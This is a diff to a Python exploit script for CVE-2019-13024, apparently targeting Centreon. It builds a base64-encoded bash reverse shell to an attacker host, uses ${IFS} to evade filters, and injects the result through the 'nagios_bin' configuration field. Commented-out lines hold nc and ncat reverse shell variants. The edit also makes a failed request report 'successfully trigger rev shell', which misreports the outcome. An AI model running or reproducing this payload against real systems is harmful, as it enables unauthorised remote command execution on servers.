@@ -60,10 +60,11 @@ class CVE2019_13024:
     def send_payload(self):
         print (LogColors.BLUE + "send payload..." + LogColors.ENDC)
         
-        raw_payload = "bash -i >& /dev/tcp/{}/{} 0>&1".format(self.lhost, self.lport)
-        raw_payload = base64.b64encode(bytes(raw_payload.encode('utf-8'))).decode()
-        payload = "echo {}|base64 -d|bash;".format(raw_payload)
+        payload = "bash -i >& /dev/tcp/{}/{} 0>&1".format(self.lhost, self.lport)
+        payload = base64.b64encode(bytes(payload.encode('utf-8'))).decode()
+        payload = "echo -n {} | base64 -d | bash;".format(payload)
         payload = payload.replace(' ', '${IFS}')
+        print (LogColors.YELLOW + payload + LogColors.ENDC)
 
         payload_data = {
             "name": "Central",
@@ -73,8 +74,7 @@ class CVE2019_13024:
             "remote_id": "",
             "ssh_port": "22",
             "init_script": "centengine",
-            "nagios_bin": "s; {}".format(payload), #"nc -e /bin/bash {0} {1} #".format(self.lhost, self.lport),
-            #"nagios_bin": "ncat -e /bin/bash {0} {1} #".format(self.lhost, self.lport),
+            "nagios_bin": "{}".format(payload),
             "nagiostats_bin": "/usr/sbin/centenginestats",
             "nagios_perfdata": "/var/log/centreon-engine/service-perfdata",
             "centreonbroker_cfg_path": "/etc/centreon-broker",
@@ -111,10 +111,7 @@ class CVE2019_13024:
                 data = data, timeout = 5
             )
         except Exception:
-            print (LogColors.RED + "failed trigger shell :(" + LogColors.ENDC)
-            sys.exit()
-        else:
-            print (LogColors.GREEN + "successfully trigger rev shell. check nc :)" + LogColors.ENDC)
+            print (LogColors.GREEN + "successfully trigger rev shell :)" + LogColors.ENDC)
 
     # exploit step by step
     def exploit(self):
